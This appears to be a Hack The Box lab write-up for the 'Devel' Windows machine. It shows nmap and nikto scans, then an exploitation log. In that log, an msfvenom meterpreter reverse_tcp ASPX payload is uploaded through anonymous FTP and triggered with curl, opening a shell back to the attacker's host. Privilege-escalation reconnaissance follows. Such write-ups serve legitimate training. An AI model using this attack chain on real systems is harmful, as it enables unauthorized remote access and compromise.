# Devel

## where you at

10.10.10.5

## what you got

```
# Nmap 7.80 scan initiated Thu Jan 23 19:06:09 2020 as: nmap -oX - -A -T4 -oN /mnt/hgfs/_shared_folder/htb/boxes/devel/scans/simple_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/devel/scans/simple_tcp.gnmap 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   18.68 ms 10.10.14.1
2   18.83 ms 10.10.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 23 19:06:25 2020 -- 1 IP address (1 host up) scanned in 16.36 seconds
```

## Port 21

FTP anon on webroot

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
```

## port 80

```
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.5
+ Target Port: 80
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 2.0.50727
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ GET /: Appears to be a default IIS 7 install.
```


## Exploit


```
msfvenom -p windows/meterpreter/reverse_tcp -f asp > r_s.asp LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of asp file: 38493 bytes

pftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put r_s.asp
local: r_s.asp remote: r_s.asp
227 Entering Passive Mode (10,10,10,5,192,13).
150 Opening ASCII mode data connection.
226 Transfer complete.
38563 bytes sent in 0.02 secs (1.8918 MB/s)
ftp> ls
227 Entering Passive Mode (10,10,10,5,192,14).
150 Opening ASCII mode data connection.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
01-27-20  04:43AM                38563 r_s.asp
01-27-20  04:40AM                 2763 shell.aspx
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.



msfconsole

use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set lhost 10.10.14.23
set lport 4444
set ExitOnSession false  
exploit -j  



curl http://10.10.10.5/r_s.asp                                         

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head>                                                                                                    
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>                                                                                                                                           
<title>500 - Internal server error.</title>



msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 --platform windows -f aspx > r_s.aspx
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2822 bytes

ftp> put r_s.aspx
local: r_s.aspx remote: r_s.aspx
227 Entering Passive Mode (10,10,10,5,192,19).
150 Opening ASCII mode data connection.
226 Transfer complete.
2858 bytes sent in 0.00 secs (6.9708 MB/s)
ftp> 


curl http://10.10.10.5/r_s.aspx

msf5 exploit(multi/handler) > [*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.5:49172) at 2020-01-23 19:59:50 +0100


meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows


meterpreter > shell
whoami
Process 1412 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\web

```

## post exploit

```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)

meterpreter > cd C:\\Users\\
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-03-18 00:16:43 +0100  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 06:53:55 +0200  All Users
40777/rwxrwxrwx   8192  dir   2017-03-18 00:06:26 +0100  Classic .NET AppPool
40555/r-xr-xr-x   8192  dir   2009-07-14 04:37:05 +0200  Default
40777/rwxrwxrwx   0     dir   2009-07-14 06:53:55 +0200  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 04:37:05 +0200  Public
40777/rwxrwxrwx   8192  dir   2017-03-17 15:17:37 +0100  babis
100666/rw-rw-rw-  174   fil   2009-07-14 06:41:57 +0200  desktop.ini



C:\Users>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1420
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       384
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       724
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       496
  TCP    10.10.10.5:21          10.10.16.109:41896     ESTABLISHED     1420
  TCP    10.10.10.5:80          10.10.14.23:40728      ESTABLISHED     4
  TCP    10.10.10.5:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.5:49175       10.10.14.23:4444       ESTABLISHED     3972
  TCP    [::]:21                [::]:0                 LISTENING       1420
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       672
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5357              [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       384
  TCP    [::]:49153             [::]:0                 LISTENING       724
  TCP    [::]:49154             [::]:0                 LISTENING       888
  TCP    [::]:49155             [::]:0                 LISTENING       488
  TCP    [::]:49156             [::]:0                 LISTENING       496
  UDP    0.0.0.0:123            *:*                                    1000
  UDP    0.0.0.0:3702           *:*                                    1384
  UDP    0.0.0.0:3702           *:*                                    1384
  UDP    0.0.0.0:5355           *:*                                    1092
  UDP    0.0.0.0:61429          *:*                                    1384
  UDP    10.10.10.5:137         *:*                                    4
  UDP    10.10.10.5:138         *:*                                    4
  UDP    [::]:123               *:*                                    1000
  UDP    [::]:3702              *:*                                    1384
  UDP    [::]:3702              *:*                                    1384
  UDP    [::]:61430             *:*                                    1384

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User             Path
 ---   ----  ----               ----  -------  ----             ----
 0     0     [System Process]                                   
 4     0     System                                             
 264   4     smss.exe                                           
 308   488   dllhost.exe                                        
 344   336   csrss.exe                                          
 384   336   wininit.exe                                        
 396   376   csrss.exe                                          
 452   376   winlogon.exe                                       
 488   384   services.exe                                       
 496   384   lsass.exe                                          
 504   384   lsm.exe                                            
 608   488   svchost.exe                                        
 672   488   svchost.exe                                        
 724   488   svchost.exe                                        
 796   452   LogonUI.exe                                        
 848   488   svchost.exe                                        
 888   488   svchost.exe                                        
 1000  488   svchost.exe                                        
 1092  488   svchost.exe                                        
 1180  488   spoolsv.exe                                        
 1216  488   svchost.exe                                        
 1316  488   svchost.exe                                        
 1384  488   svchost.exe                                        
 1420  488   svchost.exe                                        
 1508  488   VGAuthService.exe                                  
 1536  488   vmtoolsd.exe                                       
 1568  488   svchost.exe                                        
 1628  488   msdtc.exe                                          
 1700  488   powercfg.exe                                       
 2028  608   WmiPrvSE.exe                                       
 2652  488   sppsvc.exe                                         
 2684  488   svchost.exe                                        
 2792  488   SearchIndexer.exe                                  
 3148  488   svchost.exe                                        
 3772  344   conhost.exe                                        
 3972  1568  w3wp.exe           x86   0        IIS APPPOOL\Web  c:\windows\system32\inetsrv\w3wp.exe

C:\>wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn                  No Instance(s) Available.   








msf5 post(multi/recon/local_exploit_suggester) > set session 4   
session => 4                                                                                              
msf5 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                                
                                                                                                          
[*] 10.10.10.5 - Collecting local exploits for x86/windows...                                                                                                                                                       
[*] 10.10.10.5 - 29 exploit checks are being tried...                                                                                                                                                               
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                                                     
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.       
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.                                                                                                                   
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.        
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.                                                                                                             
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.                                                                                                                    
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

```